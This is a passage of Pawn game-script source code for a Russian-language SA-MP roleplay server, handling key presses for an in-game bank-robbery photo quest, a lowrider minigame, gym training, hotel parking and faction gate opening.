			    if(GetPVarInt(playerid,"GrabQuestW") == 1 && (IsPlayerInDynamicArea(playerid,lsbankphoto[0]) || IsPlayerInDynamicArea(playerid,lvbankphoto[0])))
			    {
					if(!BankGrab[band][bTown]) x = PhotoPosLS[0][3], y = PhotoPosLS[0][4], z = PhotoPosLS[0][5];
					else x = PhotoPosLV[0][3], y = PhotoPosLV[0][4], z = PhotoPosLV[0][5];
				    if(IsPlayerAimingAt(playerid,x,y,z,5))
				    {

				        switch(random(10))
				        {
				            case 0..2:
				            {
				                SetPlayerWantedLevel(playerid,1);
							    PlayerInfo[playerid][pWanted] = 1;
								SendClientMessage(playerid,CBLUE,"Внимание! Вы были объявлены в розыск 1 степени | Объявление дал: Камера наблюдения | Причина: Фотография банка");
								strmid(PlayerInfo[playerid][pSuAd], "Фотография банка", 0, strlen("Фотография банка"), 20);
				                SendClientMessage(playerid,CREWARD,"Вас заметила камера наблюдения!");
				                BankGrab[PlayerInfo[playerid][pGrabTeam]][bTimes] = gettime()+60*60;
				                ClearBandQ(playerid);
				            }
				            case 3..9:
							{
							    SendClientMessage(playerid,CREWARD,"Отправляйтесь на точку для фото!");
		    					if(!BankGrab[band][bTown]) SetPlayerRaceCheckpoint(playerid,2,PhotoPosLS[1][0],PhotoPosLS[1][1],PhotoPosLS[1][2],0,0,0,1);
		    					else SetPlayerRaceCheckpoint(playerid,2,PhotoPosLV[1][0],PhotoPosLV[1][1],PhotoPosLV[1][2],0,0,0,1);
								SetPVarInt(playerid,"GPS",1);
							}
				        }
				    }
				    else SendClientMessage(playerid,CREWARD,"Сфотографируйте главный вход в банк!");
			    }
			    if(GetPVarInt(playerid,"GrabQuestW") == 2 && (IsPlayerInDynamicArea(playerid,lsbankphoto[1]) || IsPlayerInDynamicArea(playerid,lvbankphoto[1])))
			    {
				    if(!BankGrab[band][bTown]) x = PhotoPosLS[1][3], y = PhotoPosLS[1][4], z = PhotoPosLS[1][5];
					else x = PhotoPosLV[1][3], y = PhotoPosLV[1][4], z = PhotoPosLV[1][5];
				    if(IsPlayerAimingAt(playerid,x,y,z,5))
				    {

				        switch(random(10))
				        {
				            case 0..2:
				            {
				                SetPlayerWantedLevel(playerid,1);
							    PlayerInfo[playerid][pWanted] = 1;
								SendClientMessage(playerid,CBLUE,"Внимание! Вы были объявлены в розыск 1 степени | Объявление дал: Камера наблюдения | Причина: Фотография банка");
								strmid(PlayerInfo[playerid][pSuAd], "Фотография банка", 0, strlen("Фотография банка"), 20);
				                SendClientMessage(playerid,CREWARD,"Вас заметила камера наблюдения!");
				                BankGrab[PlayerInfo[playerid][pGrabTeam]][bTimes] = gettime()+60*60;
				                ClearBandQ(playerid);
				            }
				            case 3..9:
							{
							    SendClientMessage(playerid,CREWARD,"Отправляйтесь на точку для фото!");
		    					if(!BankGrab[band][bTown]) SetPlayerRaceCheckpoint(playerid,2,PhotoPosLS[2][0],PhotoPosLS[2][1],PhotoPosLS[2][2],0,0,0,1);
		    					else SetPlayerRaceCheckpoint(playerid,2,PhotoPosLV[2][0],PhotoPosLV[2][1],PhotoPosLV[2][2],0,0,0,1);
								SetPVarInt(playerid,"GPS",1);
							}
				        }
				    }
				    else SendClientMessage(playerid,CREWARD,"Сфотографируйте систему вентиляции банка!");
			    }
			    if(GetPVarInt(playerid,"GrabQuestW") == 3 && (IsPlayerInDynamicArea(playerid,lsbankphoto[2]) || IsPlayerInDynamicArea(playerid,lvbankphoto[2])))
			    {
				    if(!BankGrab[band][bTown]) x = PhotoPosLS[2][3], y = PhotoPosLS[2][4], z = PhotoPosLS[2][5];
					else x = PhotoPosLV[2][3], y = PhotoPosLV[2][4], z = PhotoPosLV[2][5];
				    if(IsPlayerAimingAt(playerid,x,y,z,5))
				    {
				        switch(random(10))
				        {
				            case 0..2:
				            {
				                SetPlayerWantedLevel(playerid,1);
							    PlayerInfo[playerid][pWanted] = 1;
								SendClientMessage(playerid,CBLUE,"Внимание! Вы были объявлены в розыск 1 степени | Объявление дал: Камера наблюдения | Причина: Фотография банка");
								strmid(PlayerInfo[playerid][pSuAd], "Фотография банка", 0, strlen("Фотография банка"), 20);
				                SendClientMessage(playerid,CREWARD,"Вас заметила камера наблюдения!");
		                  		BankGrab[PlayerInfo[playerid][pGrabTeam]][bTimes] = gettime()+60*60;
		                  		ClearBandQ(playerid);
				            }
				            case 3..9:
							{
								DeletePVar(playerid,"GrabQuestW");
								DeletePVar(playerid,"GrabQuest");
								SendClientMessage(playerid,CREWARD,"Вы выполнили задание!");
								PlayerInfo[playerid][pGrabQuest]++;
								BankGrab[PlayerInfo[playerid][pGrabTeam]][bQuest][2] = 2;

							}
				        }
				    }
				    else SendClientMessage(playerid,CREWARD,"Сфотографируйте запасный выход банка!");
			    }
			}
		}
	}
	if(((newkeys & KEY_WALK && newkeys & KEY_UP) || (newkeys & KEY_WALK && newkeys & KEY_DOWN) || (newkeys & KEY_WALK && newkeys & KEY_LEFT) || (newkeys & KEY_WALK && newkeys & KEY_RIGHT))
		|| ((oldkeys & KEY_WALK && newkeys & KEY_UP) || (oldkeys & KEY_WALK && newkeys & KEY_DOWN) || (oldkeys & KEY_WALK && newkeys & KEY_LEFT) || (oldkeys & KEY_WALK && newkeys & KEY_RIGHT))
		|| ((newkeys & KEY_WALK && oldkeys & KEY_UP) || (newkeys & KEY_WALK && oldkeys & KEY_DOWN) || (newkeys & KEY_WALK && oldkeys & KEY_LEFT) || (newkeys & KEY_WALK && oldkeys & KEY_RIGHT))
		&& GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
 		if(PlayerInfo[playerid][pHod])
 		{
 			if(GetPVarInt(playerid,"AnimationWalk"))
 			{
				KillTimer(GetPVarInt(playerid,"AnimationWalk"));
      			DeletePVar(playerid,"AnimationWalk");
      		}
			SetPVarInt(playerid,"AnimationWalk",_:SetTimerEx("AnimationWalk", 200, 0, "i", playerid));
		}
	}
    if(GetPVarInt(playerid,"InLowRide"))
	{
	    if(newkeys & KEY_ANALOG_UP)
	    {
	        if(PlayerImageID[playerid][1] == 0)GameTextForPlayer(playerid, "~g~GOOD KEYS", 500, 4),SetPVarInt(playerid,"LowRide",GetPVarInt(playerid,"LowRide")+10),GivePoint(playerid,"+10");
	        else GameTextForPlayer(playerid, "~r~BAD KEYS", 500, 4),SetPVarInt(playerid,"LowRide",GetPVarInt(playerid,"LowRide")-20),GivePoint(playerid,"-20");

	        PlayerChangeImage(playerid, true);
			static const fmt_string[] = "LOWRIDE POINTS: ~r~%i";
		    new string[sizeof(fmt_string)-2+5];
		    format(string, sizeof(string), fmt_string, GetPVarInt(playerid,"LowRide"));
		    PlayerTextDrawSetString(playerid, PointsTD[playerid][0], string);
	    }
	    if(newkeys & KEY_ANALOG_DOWN)
	    {
	        if(PlayerImageID[playerid][1] == 1) GameTextForPlayer(playerid, "~g~GOOD KEYS", 500, 4),SetPVarInt(playerid,"LowRide",GetPVarInt(playerid,"LowRide")+10),GivePoint(playerid,"+10");
	        else GameTextForPlayer(playerid, "~r~BAD KEYS", 500, 4),SetPVarInt(playerid,"LowRide",GetPVarInt(playerid,"LowRide")-20),GivePoint(playerid,"-20");
	        PlayerChangeImage(playerid, true);
  			static const fmt_string[] = "LOWRIDE POINTS: ~r~%i";
		    new string[sizeof(fmt_string)-2+5];
		    format(string, sizeof(string), fmt_string, GetPVarInt(playerid,"LowRide"));
		    PlayerTextDrawSetString(playerid, PointsTD[playerid][0], string);
	    }
	    if(newkeys & KEY_ANALOG_LEFT)
	    {
	        if(PlayerImageID[playerid][1] == 2) GameTextForPlayer(playerid, "~g~GOOD KEYS", 500, 4),SetPVarInt(playerid,"LowRide",GetPVarInt(playerid,"LowRide")+10),GivePoint(playerid,"+10");
	        else GameTextForPlayer(playerid, "~r~BAD KEYS", 500, 4),SetPVarInt(playerid,"LowRide",GetPVarInt(playerid,"LowRide")-20),GivePoint(playerid,"-20");
	        PlayerChangeImage(playerid, true);
  			static const fmt_string[] = "LOWRIDE POINTS: ~r~%i";
		    new string[sizeof(fmt_string)-2+5];
		    format(string, sizeof(string), fmt_string, GetPVarInt(playerid,"LowRide"));
		    PlayerTextDrawSetString(playerid, PointsTD[playerid][0], string);
	    }
	    if(newkeys & KEY_ANALOG_RIGHT)
	    {
	        if(PlayerImageID[playerid][1] == 3) GameTextForPlayer(playerid, "~g~GOOD KEYS", 500, 4),SetPVarInt(playerid,"LowRide",GetPVarInt(playerid,"LowRide")+10),GivePoint(playerid,"+10");
	        else GameTextForPlayer(playerid, "~r~BAD KEYS", 500, 4),SetPVarInt(playerid,"LowRide",GetPVarInt(playerid,"LowRide")-20),GivePoint(playerid,"-20");
	        PlayerChangeImage(playerid, true);
  			static const fmt_string[] = "LOWRIDE POINTS: ~r~%i";
		    new string[sizeof(fmt_string)-2+5];
		    format(string, sizeof(string), fmt_string, GetPVarInt(playerid,"LowRide"));
		    PlayerTextDrawSetString(playerid, PointsTD[playerid][0], string);
	    }
    }

    if(newkeys & KEY_FIRE && GetPVarInt(playerid,"Tazer") && IsPlayerAttachedObjectSlotUsed(playerid, 1))
	{
		new player = GetPlayerTargetPlayer(playerid);
	    if(player != INVALID_PLAYER_ID)
    	{
    	    new Float:X, Float:Y, Float:Z;
			GetPlayerPos(player, X, Y, Z);
			if(IsPlayerInRangeOfPoint(playerid, 2.5, X, Y, Z))
			{
	            static const fmt_string[] = "%s оглушил игрока %s";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME+32];
				format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[player][pSendername]);
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
				TogglePlayerControllable(player, 0);
				SetPlayerChatBubble(playerid, "оглушил игрока", COLOR_PURPLE, 30.0, 7000);
				SetTimerEx("Uncuff1",30000,false,"i",player);
				if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
				DeletePVar(playerid,"Tazer");
			}
		}
	}
	if(newkeys & KEY_CTRL_BACK)
	{
 		if(GetPlayerTargetPlayer(playerid) != INVALID_PLAYER_ID)
    	{
	        new Float:X, Float:Y, Float:Z;
			GetPlayerPos(GetPlayerTargetPlayer(playerid), X, Y, Z);
			if(IsPlayerInRangeOfPoint(playerid, 2.5, X, Y, Z))
			{
			    SetPVarInt(playerid, "IDTar", GetPlayerTargetPlayer(playerid));
			    ShowPlayerDialog(playerid,156,DIALOG_STYLE_LIST,"Действия с игроком","{FFFFFF}Общие действия\nДействия организации","Выбрать","Отмена");
			}
		}
	}
    if(newkeys & KEY_FIRE || newkeys & KEY_JUMP || newkeys & KEY_SPRINT || newkeys & 16)
	{
	    if(GetPVarInt(playerid,"GruzW") == 2)
		{
			SetPVarInt(playerid,"GruzW",1);
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			SetPlayerCheckpoint(playerid, 1738.3090,761.8082,10.6680, 3.0);
			SendClientMessage(playerid,CLIGHTRED,"Вы уронили ящик");
		}
		if(GetPVarInt(playerid,"PesW") == 2)
		{
			SetPVarInt(playerid,"PesW",1);
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			SetPlayerAttachedObject(playerid, 1, 337, 6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.00, 1.000000);
            DisablePlayerCheckpoint(playerid);
            new check,picka;
            switch(random(8))
			{

			    case 0: check = CreateDynamicCP(-1326.5011,2720.1338,52.4785, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1326.5011,2720.1338,52.4785, 0, 0, playerid, 100.0);
				case 1: check = CreateDynamicCP(-1327.5321,2726.7690,57.4201, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1327.5321,2726.7690,57.4201, 0, 0, playerid, 100.0);
				case 2: check = CreateDynamicCP(-1339.5184,2716.8699,57.5608, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1339.5184,2716.8699,57.5608, 0, 0, playerid, 100.0);
				case 3: check = CreateDynamicCP(-1331.4587,2705.1772,54.6513, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1331.4587,2705.1772,54.6513, 0, 0, playerid, 100.0);
				case 4: check = CreateDynamicCP(-1346.6035,2731.0549,56.3454, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1346.6035,2731.0549,56.3454, 0, 0, playerid, 100.0);
				case 5: check = CreateDynamicCP(-1341.8770,2754.1526,60.3163, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1341.8770,2754.1526,60.3163, 0, 0, playerid, 100.0);
				case 6: check = CreateDynamicCP(-1331.9568,2748.6819,59.9250, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1331.9568,2748.6819,59.9250, 0, 0, playerid, 100.0);
				case 7: check = CreateDynamicCP(-1359.0675,2726.4775,57.1666, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1359.0675,2726.4775,57.1666, 0, 0, playerid, 100.0);
			}
			SetPVarInt(playerid,"PesCheck",check);
			SetPVarInt(playerid,"PesPick",picka);
			SendClientMessage(playerid,CLIGHTRED,"Вы уронили мешок");
		}
	}
	if((oldkeys & 128 && newkeys & 16))
	{
		if(IsPlayerInRangeOfPoint(playerid, 8.0,769.7948,13.6370,1000.6994) && GetPVarInt(playerid,"AntiFlood22") < gettime())
		{
		    if(PlayerInfo[playerid][pUdar] < 30*PlayerInfo[playerid][pSkillT]) PlayerInfo[playerid][pUdar]++;
			new string[10];
		    format(string,16,"%d/%d",PlayerInfo[playerid][pUdar],30*PlayerInfo[playerid][pSkillT]);
			GameTextForPlayer(playerid,string,500,6);
			SetPVarInt(playerid,"AntiFlood22",gettime() + 1);
		    if(PlayerInfo[playerid][pUdar] >= 30*PlayerInfo[playerid][pSkillT]) SendClientMessage(playerid,-1,"Вы выполнили норму для вашего уровня");
		}
	}
	if(newkeys == 8192)
	{
        if((Trenag[playerid]==3 ||  Trenag[playerid]==7) && down[playerid] && GetPVarInt(playerid,"AntiFlood22") < gettime())
	    {
	        ApplyAnimation( playerid, "Freeweights", "gym_free_up_smooth", 4.1, 0, 0, 0, 1, 1 );
	        down[playerid]=false;
			if(PlayerInfo[playerid][pGiri] < 20*PlayerInfo[playerid][pSkillT]) PlayerInfo[playerid][pGiri]++;
	        if(PlayerInfo[playerid][pGiri] >= 20*PlayerInfo[playerid][pSkillT])
	        {
				EndKach(playerid,Trenag[playerid]);
				SendClientMessage(playerid,-1,"Вы выполнили норму для вашего уровня");
	        }
	        KolRaz(playerid);
			
	    }
	    if((Trenag[playerid]==1 ||  Trenag[playerid]==5) && down[playerid] && GetPVarInt(playerid,"AntiFlood22") < gettime())
	    {
	        ApplyAnimation( playerid, "benchpress", "gym_bp_up_smooth", 4.1, 0, 0, 0, 1, 0 );
	        down[playerid]=false;
			if(PlayerInfo[playerid][pShtanga] < 15*PlayerInfo[playerid][pSkillT]) PlayerInfo[playerid][pShtanga]++;
	        SetPVarInt(playerid,"AntiFlood22",gettime() + 1);
	        if(PlayerInfo[playerid][pShtanga] >= 15*PlayerInfo[playerid][pSkillT])
	        {
				SendClientMessage(playerid,-1,"Вы выполнили норму для вашего уровня");
				EndKach(playerid,Trenag[playerid]);
	        }
	        KolRaz(playerid);
			
	    }
	}
	if(newkeys == 512)
	{
        if((Trenag[playerid]==1 ||  Trenag[playerid]==5) && !down[playerid] && GetPVarInt(playerid,"AntiFlood22") < gettime())
		{
            down[playerid]=true;
            SetPVarInt(playerid,"AntiFlood22",gettime() + 1);
	        ApplyAnimation(playerid,"benchpress","gym_bp_down",4.1,0,0,0,1,1,1);
	    }
	    if(Trenag[playerid]==2 || Trenag[playerid]==6)
	    {
            if(kol[playerid]<4) kol[playerid]++;
   	        if(PlayerInfo[playerid][pVelo] >= 40*PlayerInfo[playerid][pSkillT])
	        {
				SendClientMessage(playerid,-1,"Вы выполнили норму для вашего уровня");
				EndKach(playerid,Trenag[playerid]);
	        }
	        KolRaz(playerid);
			
	    }
	    if(Trenag[playerid]==4 || Trenag[playerid]==8)
	    {
            if(kol[playerid]<3) kol[playerid]++;
   	        if(PlayerInfo[playerid][pBeg] >= 50*PlayerInfo[playerid][pSkillT])
	        {
				SendClientMessage(playerid,-1,"Вы выполнили норму для вашего уровня");
				EndKach(playerid,Trenag[playerid]);
	        }
	        KolRaz(playerid);
			
	    }
	    if((Trenag[playerid]==3 ||  Trenag[playerid]==7) && !down[playerid] && GetPVarInt(playerid,"AntiFlood22") < gettime()) { ApplyAnimation( playerid, "Freeweights", "gym_free_down", 4.1, 0, 0, 0, 1, 1 ); down[playerid]=true; SetPVarInt(playerid,"AntiFlood22",gettime() + 1); }
	}
	if(newkeys & KEY_CROUCH)
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
	    
	        
	        new biz,
	            car = GetPlayerVehicleID(playerid);
			static Float:poscars[4][4] = {
				{2156.2117,2221.6367,10.4960,91.9794}, // 45 biz car
				{2340.1912,2097.7249,10.3534,267.0892}, // 46 biz car
				{-221.9008,1094.7085,19.3487,2.9551}, // 47 biz car
				{-161.8579,1102.7373,19.3526,180.1815} // 48 biz car
			};
			if(IsPlayerInRangeOfPoint(playerid,2.0,1015.4460,1055.8969,2997.2297) && GetPlayerVirtualWorld(playerid) == 90)
			{
                 SetTeleportCar(car,1439.2494,-1830.2848,13.2687,180.7446,0,0);
			}
			if(IsPlayerInRangeOfPoint(playerid,2.0,1015.4460,1055.8969,2997.2297) && GetPlayerVirtualWorld(playerid) == 95)
			{
                SetTeleportCar(car,988.6832,1071.9758,10.5461,2.0514,0,0);
			}
			if(IsPlayerInDynamicArea(playerid,fbipark) && PlayerInfo[playerid][pMember] == F_FBI)
			{
			    SetTeleportCar(car,1015.4460,1055.8969,2997.2297,88.7692,4,95);
			}
			if(IsPlayerInDynamicArea(playerid,meriapark) && PlayerInfo[playerid][pMember] == 1)
			{
			    SetTeleportCar(car,1015.4460,1055.8969,2997.2297,88.7692,4,90);
			}
	        for(new i = 0; i < 4; i++)
	        {
		        if(!IsPlayerInDynamicArea(playerid,parkingzone[i])) continue;
				if(GetPlayerKom(playerid) && KomInfo[GetPVarInt(playerid,"PlayerKom")][kbiz] == 45+i)
				{
				    biz = 45+i;
				    SetPVarInt(playerid,"PBIZ",biz);
				    SetPlayerVirtualWorld(playerid,biz);
				    SetPlayerInterior(playerid,4);
				    LinkVehicleToInterior(car,4);
				    SetVehicleVirtualWorld(car,biz);
				    SetVehiclePos(car,2435.5957,2271.3696,991.1752);
				    SetVehicleZAngle(car,269.7361);
				    PutPlayerInVehicle(playerid, car, 0);
				  //  DeletePVar(playerid,"Freeze");
			      //  TogglePlayerControllable(playerid, 0);
			        SetVehicleVelocity(car,0,0,0);
			        FreezePlayer(playerid,2435.5957,991.1752,0.8);

				}
				else SendClientMessage(playerid,CGREY,"У Вас нет комнаты в данном отеле!");

	        }
	        if(IsPlayerInRangeOfPoint(playerid,2.0,2435.5957,2271.3696,991.1752) && GetPlayerInterior(playerid) == 4)
			{
			    biz = GetPVarInt(playerid,"PBIZ")-45;
			    DeletePVar(playerid,"PBIZ");
			    SetPlayerVirtualWorld(playerid,0);
			    SetPlayerInterior(playerid,0);
			    LinkVehicleToInterior(car,0);
			    SetVehicleVirtualWorld(car,0);
			    SetVehiclePos(car,poscars[biz][0],poscars[biz][1],poscars[biz][2]);
			    SetVehicleZAngle(car,poscars[biz][3]);
			    PutPlayerInVehicle(playerid, car, 0);
			}
	        if(IsAGos(playerid))
	        {
	            if(IsPlayerInDynamicArea(playerid,fcpdsp1[0]) && !IsDynamicObjectMoving(fcpdgate[0]))
		   		{
		   		    MoveDynamicObject(fcpdgate[0],-206.26221, 974.95380+0.1, 18.53900,0.12,   0.00000, 0.00000, -89.28000);
		   		    SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",fcpdgate[0],-206.26221, 974.95380-0.1, 18.53900,0.12,   0.00000, -89.56000, -89.00000);
		   		    
				}
				if(IsPlayerInDynamicArea(playerid,fcpdsp1[1]) && !IsDynamicObjectMoving(fcpdgate[1]))
		   		{
		   		    MoveDynamicObject(fcpdgate[1],-215.73421, 1007.72046+0.1, 19.37720,0.12,  0.00000, 0.00000, -1.86000);
		   		    SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",fcpdgate[1],-215.73421, 1007.72052-0.1, 19.37720,0.12,  0.00000, -89.72000, -2.00000);

				}
	            if(IsPlayerInDynamicArea(playerid,newssp) && !IsDynamicObjectMoving(newsgate))
		   		{
		   		    new Float:x,Float:y,Float:z;
					GetDynamicObjectRot(newsgate,x,y,z);
					if(floatround(y) == -89)
					{
						MoveDynamicObject(newsgate,1700.6613, -1281.2810+0.02, 15.4136,0.12,   0.0000, -18.1000, 270.0000);
						SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",newsgate,1700.6613, -1281.2810, 15.4136,0.12,   0.0000, -89.1000, 270.0000);
					}
				}
	            if(IsPlayerInDynamicArea(playerid,hossp) && !IsDynamicObjectMoving(bolka))
		   		{
		   		    new Float:x,Float:y,Float:z;
					GetDynamicObjectRot(bolka,x,y,z);
					if(y == -90.0000)
					{
						MoveDynamicObject(bolka,1215.77905, -1326.05811+0.02, 13.12190,0.12,   0.00000, 0.00000, 90.00000);
						SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",bolka,1215.77905, -1326.05811, 13.12190,0.12,   0.00000, -90.00000, 90.00000);
					}
				}
				
		  		if(IsPlayerInDynamicArea(playerid,fbisp) && !IsDynamicObjectMoving(fbigate))
		   		{
		   		    new Float:x,Float:y,Float:z;
					GetDynamicObjectRot(fbigate,x,y,z);
					if(floatround(y) == 90)
					{
						MoveDynamicObject(fbigate,1024.9763, 1162.3307+0.02, 10.3847,0.12,   0.00000, 0.00000, 0.00000);
						SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",fbigate,1024.9763, 1162.3307, 10.3847,0.12,   0.00000, 89.50000, 0.00000);
					}
    			}
	            if(IsPlayerInDynamicArea(playerid,lspdspveh[1]) && !IsDynamicObjectMoving(lspd[1]))
		   		{

		            new Float:dx,Float:dy,Float:dz;
		  		    GetDynamicObjectPos(lspd[1],dx,dy,dz);
		  		    if(dz == 14.73610)
				  	{
						MoveDynamicObject(lspd[1],dx,dy,7.89249,2);
						SetTimerEx("MoveObjectOpen",5000,false,"dffff",lspd[1],dx,dy,14.73610,2.0);
					}
		  		}
	            if(IsPlayerInDynamicArea(playerid,lspdspveh[0]) && !IsDynamicObjectMoving(lspd[0]))
		   		{
		   		    new Float:x,Float:y,Float:z;
					GetDynamicObjectRot(lspd[0],x,y,z);
					if(y == 89.00000)
					{
						MoveDynamicObject(lspd[0],1544.70789, -1630.89185+0.2, 13.03080,0.12,   0.00000, 0.00000, 90.00000);
						SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",lspd[0],1544.70789, -1630.89185, 13.03080,0.12,   0.00000, 89.00000, 90.00000);
					}
				}

                if(PlayerInfo[playerid][pMember] == F_LIC || GetPVarInt(playerid,"LicTest"))
				{
				    if(IsPlayerInDynamicArea(playerid,ashsp) && !IsDynamicObjectMoving(ashshlag))
			   		{
			   		    new Float:dx,Float:dy,Float:dz;
			  		    GetDynamicObjectPos(ashshlag,dx,dy,dz);
			  		    if(dy == -90.000015)
					  	{
						  	MoveDynamicObject(turmagate[0],dx,0.0,dz,2);
				  		    SetTimerEx("MoveObjectOpen",5000,false,"dffff",ashshlag,dx,-90.000015,dz,2.0);
					  	}
			   		}
				}
			
		  		if(IsPlayerInDynamicArea(playerid,turmagatesp[0]) && !IsDynamicObjectMoving(arenagate[0]))
		   		{
		   		  // SetPlayerFacingAngle(playerid,184.4218);
		   		   // ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
		            new Float:dx,Float:dy,Float:dz;
		  		    GetDynamicObjectPos(turmagate[0],dx,dy,dz);
		  		    new Float:dx1,Float:dy1,Float:dz1;
		  		    GetDynamicObjectPos(turmagate[1],dx1,dy1,dz1);
		  		    if(dy == 1415.695)
				  	{
						MoveDynamicObject(turmagate[0],dx,1423.6639,dz,2),MoveDynamicObject(turmagate[1],dx1,1399.8525,dz1,2);
						SetTimerEx("MoveObjectOpen",5000,false,"dffff",turmagate[1],dx1,1407.753,dz1,2.0);
						SetTimerEx("MoveObjectOpen",5000,false,"dffff",turmagate[0],dx,1415.695,dz,2.0);
			  		}
		  		    //else MoveDynamicObject(turmagate[0],dx,1415.695,dz,2),MoveDynamicObject(turmagate[1],dx1,1407.753,dz1,2);
		  		}
		  		else if(IsPlayerInDynamicArea(playerid,turmagatesp[1]) && !IsDynamicObjectMoving(arenagate[1]))
		  		{
		  		   // SetPlayerFacingAngle(playerid,181.4268);
		  		  //  ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
		  		    new Float:dx,Float:dy,Float:dz;
		  		    GetDynamicObjectPos(turmagate[0],dx,dy,dz);
		  		    new Float:dx1,Float:dy1,Float:dz1;
		  		    GetDynamicObjectPos(turmagate[1],dx1,dy1,dz1);
		  		    if(dy == 1415.695)
				  	{
						MoveDynamicObject(turmagate[0],dx,1423.6639,dz,2),MoveDynamicObject(turmagate[1],dx1,1399.8525,dz1,2);
						SetTimerEx("MoveObjectOpen",5000,false,"dffff",turmagate[1],dx1,1407.753,dz1,2.0);
						SetTimerEx("MoveObjectOpen",5000,false,"dffff",turmagate[0],dx,1415.695,dz,2.0);
				  	}
		  		    //else MoveDynamicObject(turmagate[0],dx,1415.695,dz,2),MoveDynamicObject(turmagate[1],dx1,1407.753,dz1,2);
		  		}

  		        if((IsPlayerInDynamicArea(playerid,areagatesp[0])) && !IsDynamicObjectMoving(areagate[0]))
		   		{
		   		    new Float:x,Float:y,Float:z;
		   		    //if(IsPlayerInDynamicArea(playerid,areagsp[0])) SetPlayerFacingAngle(playerid,91.7476);
		   		    //else if(IsPlayerInDynamicArea(playerid,areagsp[1])) SetPlayerFacingAngle(playerid,268.6418);
					GetDynamicObjectPos(areagate[0],x,y,z);
				//	ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
					if(x == 135.21449)
					{
					 	MoveDynamicObject(areagate[0],121.10500, y, z,4);
						SetTimerEx("MoveObjectOpen",5000,false,"dffff",areagate[0],135.21449, y, z,4.0);
					}
				//	else MoveDynamicObject(areagate[0],135.21449, y, z,4);
				}
				if((IsPlayerInDynamicArea(playerid,areagatesp[1])) && !IsDynamicObjectMoving(areagate[1]) )
		   		{
		   		    new Float:x,Float:y,Float:z;
		   		//    if(IsPlayerInDynamicArea(playerid,areagsp[2])) SetPlayerFacingAngle(playerid,2.6711);
		   		 //   else if(IsPlayerInDynamicArea(playerid,areagsp[3])) SetPlayerFacingAngle(playerid,183.1634);
					GetDynamicObjectPos(areagate[1],x,y,z);
				//	ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
					if(y == 1821.27307)
					{
					 	MoveDynamicObject(areagate[1],x, 1835.32739, z,4);
						SetTimerEx("MoveObjectOpen",5000,false,"dffff",areagate[1],x, 1821.27307, z,4.0);
					}
					//MoveDynamicObject(areagate[1],x, 1821.27307, z,4);
				}
	
	 			if(IsPlayerInDynamicArea(playerid,lvpdspveh) && !IsDynamicObjectMoving(lvpdsh))
		   		{
		   		    new Float:x,Float:y,Float:z;
		   		    //SetPlayerFacingAngle(playerid,93.8173);
					GetDynamicObjectRot(lvpdsh,x,y,z);
					//ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
					if(y == 90.00000)
					{
						MoveDynamicObject(lvpdsh,2238.19629, 2450.41284, 10.38020,0.12,   0.00000, 0.00000, 90.00000);
						//else MoveDynamicObject(lvpdsh,2238.19629, 2450.33276, 10.72020,0.12,   0.00000, 90.00000, 90.00000);
						SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",lvpdsh,2238.19629, 2450.33276, 10.72020,0.12,   0.00000, 90.00000, 90.00000);
					}
				}
			}
	    }
	}
	if(newkeys == KEY_CTRL_BACK)
	{
	    
	    if(GetPVarInt(playerid,"PHOUSE") > 0)
	    {
	        GetPlayerHouse(playerid);
	    	GetPlayerZasel(playerid);
	    	if(GetPVarInt(playerid,"PHOUSE") == GetPVarInt(playerid,"PlayerHouse") || PlayerInfo[playerid][pFam] && FamInfo[PlayerInfo[playerid][pFam]][fHouse] == GetPVarInt(playerid,"PHOUSE") && FamInfo[PlayerInfo[playerid][pFam]][fShkaf])
	    	{
		        if(IsPlayerInRangeOfPoint(playerid,2.0,HInfo[GetPVarInt(playerid,"PHOUSE")][hShkafX],HInfo[GetPVarInt(playerid,"PHOUSE")][hShkafY],HInfo[GetPVarInt(playerid,"PHOUSE")][hShkafZ]) && !GetPVarInt(playerid,"OpenHouse"))
				{
				        GetPlayerHouse(playerid);
				        CreateInv(playerid);
				        CreateTrunk(playerid);
						TextDrawSetString(Inventory1[4],"HOUSE");
						
						for(new i = 0; i < 16; i++)
						{
					 		if(i < 15) TextDrawShowForPlayer(playerid,Inventory[i]);
					 		TextDrawShowForPlayer(playerid,Inventory1[i]);
						}
						TextDrawShowForPlayer(playerid,Inventory[22]);
						new weapons[7],ammo[7];
						new str[5];
						new gun;
